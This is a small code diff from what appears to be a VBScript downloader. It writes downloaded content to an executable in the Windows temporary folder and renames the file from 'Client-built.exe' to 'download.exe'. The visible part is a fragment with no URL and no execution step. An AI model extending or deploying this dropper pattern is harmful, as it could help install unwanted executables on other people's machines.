@@ -23,7 +23,7 @@ End If
 ' Set up file system objects
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set temp = fso.GetSpecialFolder(2) ' Temporary folder
-tempFile = temp & "\Client-built.exe"
+tempFile = temp & "\download.exe"
 
 ' Write the downloaded content to a file
 Set stream = CreateObject("ADODB.Stream")
